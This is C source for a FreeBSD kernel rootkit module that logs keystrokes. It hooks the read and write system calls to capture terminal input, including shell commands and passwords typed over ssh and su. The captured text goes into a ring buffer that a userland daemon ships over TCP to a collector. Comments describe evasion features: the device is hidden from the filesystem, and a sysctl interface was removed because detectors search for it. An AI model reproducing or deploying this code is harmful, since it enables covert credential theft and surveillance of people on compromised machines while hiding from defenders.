/*
 * rootkit: kernel-side keylogging.
 *
 * Two halves live here:
 *
 *   1. capture  - sysent[SYS_read] is patched so every successful read(0)
 *                 (i.e. whatever a shell / login / sshd pulls off the
 *                 terminal) is copied into a kernel ring buffer.
 *   2. delivery - the ring buffer is drained by the cdev read handler in
 *                 interface.c, which a userland daemon (logsrc/sender.c)
 *                 then ships over TCP to the collector (logsrc/collector.c).
 *
 * Why the split: capturing has to happen in the kernel (that is the whole
 * point of the rootkit), but a TCP session belongs in userland. The kernel
 * side only has to expose "give me the bytes that piled up".
 */

#include <sys/param.h>
#include <sys/capsicum.h>
#include <sys/filedesc.h>
#include <sys/file.h>
#include <sys/kernel.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/proc.h>
#include <sys/selinfo.h>
#include <sys/stdarg.h>
#include <sys/syscall.h>
#include <sys/sysctl.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/systm.h>
#include <sys/time.h>
#include <sys/ucred.h>
#include <sys/uio.h>
#include <sys/vnode.h>

#include "log.h"
#include "interface.h"

#ifndef RK_LOG_SIZE
#define RK_LOG_SIZE	(64 * 1024)	/* ring buffer size, power of two is nice */
#endif

#define RK_LOG_LINE_MAX	512		/* one formatted entry, incl. header */
#define RK_LOG_CHUNK	256		/* max bytes copied out of one read() */
#define RK_LOG_MAX_CHUNKS 8		/* cap on the work a single read() may cause */

/*
 * Ring buffer. rk_log_tail is the index of the oldest byte, rk_log_len is
 * how many valid bytes follow it (wrapping at RK_LOG_SIZE). When the buffer
 * is full the oldest bytes are thrown away, so the newest input always
 * survives.
 */
static char		rk_log_buf[RK_LOG_SIZE];
static size_t		rk_log_tail;
static size_t		rk_log_len;

static struct mtx	rk_log_mtx;
MTX_SYSINIT(rk_log_mtx, &rk_log_mtx, "rootkit log", MTX_DEF);

static struct selinfo	rk_log_si;

/*
 * Line assembler: terminal reads arrive one keystroke at a time, so bytes are
 * gathered here until the line is complete. Guarded by rk_line_mtx, which is
 * never held while rk_log_write() takes rk_log_mtx.
 */
static char		rk_line_buf[RK_LOG_LINE_MAX];
static size_t		rk_line_len;
static int		rk_line_pid;
static int		rk_line_uid;
static int		rk_line_last_cr;

static struct mtx	rk_line_mtx;
MTX_SYSINIT(rk_line_mtx, &rk_line_mtx, "rootkit log line", MTX_DEF);

static sy_call_t	*rk_read_orig;
static sy_call_t	*rk_write_orig;
static int		rk_hook_installed;

/*
 * There is deliberately no sysctl control plane here.
 *
 * An earlier version published the whole story under kern.rootkit.*:
 * a node whose name is the string a detector greps for, plus tunables that
 * described exactly what was being captured. `sysctl -a | grep -i rootkit`
 * found it on a loaded host and told the reader everything. The two switches
 * below stay as compile-time constants (both off), which is what the defaults
 * were anyway; the counters are only useful for debugging and are gone.
 *
 * The ring is read through /dev/rootkit, which is opened by rklog and hidden
 * from the filesystem by the module's own hooks.
 */
static int	rk_log_stdout;	/* capture write(1)/write(2): off */
static int	rk_log_pipes;	/* capture non-tty stdin: off */

/* ------------------------------------------------------------------ */
/* ring buffer                                                         */
/* ------------------------------------------------------------------ */

static void
rk_log_wakeup(void)
{

	wakeup(&rk_log_len);
	selwakeup(&rk_log_si);
}

void
rk_log_write(const void *data, size_t len)
{
	const char *src = data;
	size_t space, drop, pos, first;

	if (len == 0)
		return;

	mtx_lock(&rk_log_mtx);

	/* Anything bigger than the whole buffer: keep only the tail of it. */
	if (len >= RK_LOG_SIZE) {
		src += len - RK_LOG_SIZE;
		len = RK_LOG_SIZE;
		rk_log_tail = 0;
		rk_log_len = 0;
	}

	/* Make room by dropping the oldest bytes. */
	space = RK_LOG_SIZE - rk_log_len;
	if (len > space) {
		drop = len - space;
		rk_log_tail = (rk_log_tail + drop) % RK_LOG_SIZE;
		rk_log_len -= drop;
	}

	pos = (rk_log_tail + rk_log_len) % RK_LOG_SIZE;
	first = MIN(len, RK_LOG_SIZE - pos);
	memcpy(&rk_log_buf[pos], src, first);
	if (len > first)
		memcpy(&rk_log_buf[0], src + first, len - first);
	rk_log_len += len;

	mtx_unlock(&rk_log_mtx);

	rk_log_wakeup();
}

void
rk_log_printf(const char *fmt, ...)
{
	char	line[RK_LOG_LINE_MAX];
	va_list	ap;
	int	n;

	va_start(ap, fmt);
	n = vsnprintf(line, sizeof(line), fmt, ap);
	va_end(ap);

	if (n <= 0)
		return;
	if ((size_t)n >= sizeof(line))
		n = sizeof(line) - 1;

	rk_log_write(line, (size_t)n);
}

size_t
rk_log_read(void *dst, size_t len)
{
	char	*out = dst;
	size_t	 first;

	if (len == 0)
		return (0);

	mtx_lock(&rk_log_mtx);
	if (rk_log_len == 0) {
		mtx_unlock(&rk_log_mtx);
		return (0);
	}
	if (len > rk_log_len)
		len = rk_log_len;

	first = MIN(len, RK_LOG_SIZE - rk_log_tail);
	memcpy(out, &rk_log_buf[rk_log_tail], first);
	if (len > first)
		memcpy(out + first, &rk_log_buf[0], len - first);

	rk_log_tail = (rk_log_tail + len) % RK_LOG_SIZE;
	rk_log_len -= len;
	mtx_unlock(&rk_log_mtx);

	return (len);
}

/*
 * Called from the cdev poll handler. Returns 1 if data is waiting, otherwise
 * registers the thread so rk_log_wakeup() will wake it up. Both the check and
 * the registration happen under the same lock, so no wakeup can be lost.
 */
int
rk_log_poll_ready(struct thread *td)
{
	int ready;

	mtx_lock(&rk_log_mtx);
	ready = (rk_log_len > 0);
	if (!ready)
		selrecord(td, &rk_log_si);
	mtx_unlock(&rk_log_mtx);

	return (ready);
}

/* ------------------------------------------------------------------ */
/* capture                                                             */
/* ------------------------------------------------------------------ */

/*
 * A terminal hands read() one keystroke at a time in raw mode and one line at a
 * time in canonical mode; a paste can be kilobytes. Logging every read()
 * separately turns "ls -la" into ten log lines, so bytes are assembled here
 * first and emitted when the line ends, when the buffer fills up, when another
 * process takes over the buffer, or when the module is unloaded.
 *
 * Every emitted line looks like:
 *
 *	[t=1700000000.123456 pid=812 uid=1001] ls -la
 *
 * Control characters are folded to '.' so the collector's log stays greppable
 * and nothing in it can drive a terminal.
 */
static void
rk_line_emit(void)
{
	char		buf[RK_LOG_LINE_MAX + 96];
	struct timeval	tv;
	int		hdr, len;

	if (rk_line_len == 0)
		return;

	microtime(&tv);
	hdr = snprintf(buf, sizeof(buf), "[t=%lld.%06ld pid=%d uid=%d] ",
	    (long long)tv.tv_sec, (long)tv.tv_usec, rk_line_pid, rk_line_uid);
	if (hdr < 0)
		hdr = 0;
	if ((size_t)hdr > sizeof(buf) - 2)
		hdr = (int)sizeof(buf) - 2;

	len = (int)rk_line_len;
	if ((size_t)len > sizeof(buf) - (size_t)hdr - 1)
		len = (int)(sizeof(buf) - (size_t)hdr - 1);

	memcpy(buf + hdr, rk_line_buf, (size_t)len);
	buf[hdr + len] = '\n';

	rk_log_write(buf, (size_t)(hdr + len + 1));
	rk_line_len = 0;
}

static void
rk_line_put(struct thread *td, char c)
{
	int	pid, uid;

	pid = td->td_proc->p_pid;
	uid = td->td_ucred->cr_uid;

	/*
	 * A different process typing means the partial line in the buffer is
	 * someone else's; emit it before starting a new one so the log stays
	 * attributable.
	 */
	if (rk_line_len > 0 && (pid != rk_line_pid || uid != rk_line_uid))
		rk_line_emit();
	if (rk_line_len == 0) {
		rk_line_pid = pid;
		rk_line_uid = uid;
	}

	rk_line_buf[rk_line_len++] = c;
	if (c == '\n' || rk_line_len >= sizeof(rk_line_buf))
		rk_line_emit();
}

/*
 * Walk the buffer in RK_LOG_CHUNK pieces so a 4 KB paste is not truncated, and
 * stop after RK_LOG_MAX_CHUNKS so a hostile or accidental 1 MB read() cannot
 * spend unbounded time in the hook.
 */
static void
rk_log_capture(struct thread *td, const void *ubuf, size_t len)
{
	char		chunk[RK_LOG_CHUNK];
	size_t		done, n, i;
	int		chunks;

	done = 0;
	chunks = 0;
	while (done < len && chunks < RK_LOG_MAX_CHUNKS) {
		n = MIN(len - done, sizeof(chunk));
		if (copyin((const char *)ubuf + done, chunk, n) != 0)
			break;

		/*
		 * devd keeps /dev/console open and reads syslog lines out of it
		 * ('!system=DEVFS ...'); those arrive on a tty like anything else
		 * and would bury every keystroke. They all start with '!'.
		 */
		if (chunk[0] == '!')
			break;

		mtx_lock(&rk_line_mtx);
		for (i = 0; i < n; i++) {
			unsigned char c = (unsigned char)chunk[i];

			/*
			 * A pty in raw mode hands back CR for Enter, and sshd
			 * leaves the slave side that way, so CR has to end the
			 * line here too - otherwise every command typed over
			 * ssh runs into the next one.
			 */
			if (c == '\r') {
				rk_line_put(td, '\n');
				rk_line_last_cr = 1;
				continue;
			}
			if (c == '\n') {
				if (rk_line_last_cr) {
					rk_line_last_cr = 0;
					continue;
				}
				rk_line_put(td, '\n');
				continue;
			}
			rk_line_last_cr = 0;
			if (c == '\t' || (c >= 0x20 && c < 0x7f))
				rk_line_put(td, (char)c);
			else
				rk_line_put(td, '.');
		}
		mtx_unlock(&rk_line_mtx);

		done += n;
		chunks++;
	}
}

/*
 * Flush whatever is half-typed. Called from rk_log_uninit() so an unload does
 * not silently drop the line that was in progress.
 */
void
rk_line_flush(void)
{

	mtx_lock(&rk_line_mtx);
	rk_line_emit();
	mtx_unlock(&rk_line_mtx);
}

/*
 * Is fd 0 of this thread a terminal?
 *
 * Two independent tests are ORed together because they do not agree on every
 * descriptor: devfs tags the vnode with VV_ISTTY only when the device was
 * created with D_TTY (see devfs_vnops.c), while a pty slave handed over by
 * sshd can reach the process without that flag being visible.  Anything that
 * is a character device is therefore treated as a terminal as well: a pty, the
 * console and /dev/tty all qualify, while pipes, sockets and regular files -
 * the descriptors that flooded the ring with `ls | cat` output - do not.
 *
 * fget_read() is used with real read rights rather than fget() with a NULL
 * rights pointer: NULL is accepted by the header but faults inside fget on
 * 14.5 (seen as a page fault in fget+0x2e from rk_read_hook during boot).
 * Reading the descriptor table by hand instead would mean fget_locked() and
 * a warn_unused_result fhold(), which the build turns into an error.
 */
static int
rk_fd_is_tty(struct thread *td, int fd)
{
	struct file	*fp;
	struct vnode	*vp;
	int		 is_tty, err;

	err = fget_read(td, fd, &cap_read_rights, &fp);
	if (err != 0)
		return (0);

	is_tty = 0;
	vp = NULL;
	if (fp->f_type == DTYPE_VNODE && fp->f_vnode != NULL) {
		vp = fp->f_vnode;
		if (!rootkit_is_our_vnode(vp) &&
		    ((vp->v_vflag & VV_ISTTY) != 0 || vp->v_type == VCHR))
			is_tty = 1;
	}
	fdrop(fp, td);

	return (is_tty);
}

/*
 * Replacement for sys_read(). The original syscall always runs first, so the
 * rootkit cannot break normal I/O; only after a successful read from a
 * terminal do we look at what came back.
 *
 * The descriptor number is not the test. sshd and su(1) hand the tty to the
 * child on whatever descriptor is free -- a trace of a login over ssh shows
 * the shell reading it as fd 5 while fd 0 is the same pty -- so requiring
 * fd 0 captured nothing on a real login. The type of the vnode decides,
 * and rootkit_is_our_vnode() keeps the sender's drain of /dev/rootkit out of
 * the ring, which is what the fd == 0 test used to do by accident.
 */
static int
rk_read_hook(struct thread *td, void *args)
{
	struct read_args	*uap = args;
	int			 error;

	error = rk_read_orig(td, args);

	if (error == 0 && td->td_retval[0] > 0 &&
	    (rk_log_pipes != 0 || rk_fd_is_tty(td, uap->fd)))
		rk_log_capture(td, uap->buf, (size_t)td->td_retval[0]);

	return (error);
}

/*
 * Replacement for sys_write(). Same rule as read: run the real syscall first,
 * look at the bytes afterwards. Off by default because program output is far
 * noisier than keystrokes and would flush the ring during a single `ls -l /`.
 *
 * This is what captures a password typed into a program that reads without
 * echo, e.g. ssh/su prompts, provided the program writes its prompt to the
 * terminal -- the input itself is still caught by the read hook.
 */
static int
rk_write_hook(struct thread *td, void *args)
{
	struct write_args	*uap = args;
	int			 error;

	error = rk_write_orig(td, args);

	if (error == 0 && rk_log_stdout &&
	    (uap->fd == 1 || uap->fd == 2) && td->td_retval[0] > 0)
		rk_log_capture(td, uap->buf, (size_t)td->td_retval[0]);

	return (error);
}

int
rk_log_hook_install(void)
{

	if (rk_hook_installed)
		return (0);

	rk_read_orig = sysent[SYS_read].sy_call;
	sysent[SYS_read].sy_call = (sy_call_t *)rk_read_hook;

	rk_write_orig = sysent[SYS_write].sy_call;
	sysent[SYS_write].sy_call = (sy_call_t *)rk_write_hook;

	rk_hook_installed = 1;

	return (0);
}

void
rk_log_hook_remove(void)
{

	if (!rk_hook_installed)
		return;

	sysent[SYS_read].sy_call = rk_read_orig;
	rk_read_orig = NULL;

	sysent[SYS_write].sy_call = rk_write_orig;
	rk_write_orig = NULL;

	rk_hook_installed = 0;
}

/* ------------------------------------------------------------------ */
/* lifecycle                                                           */
/* ------------------------------------------------------------------ */

void
rk_log_init(void)
{

	mtx_lock(&rk_log_mtx);
	rk_log_tail = 0;
	rk_log_len = 0;
	mtx_unlock(&rk_log_mtx);
}

void
rk_log_uninit(void)
{

	/* The buffer is static: dropping what is left is all the cleanup needed. */
	rk_log_hook_remove();

	/* Do not swallow a half-typed line just because the module is going away. */
	rk_line_flush();

	/*
	 * Nothing may be left waiting on a selinfo that is about to go away
	 * with the module: a waiter woke up after unload would touch freed
	 * mappings.
	 */
	seldrain(&rk_log_si);

	rk_log_init();
}
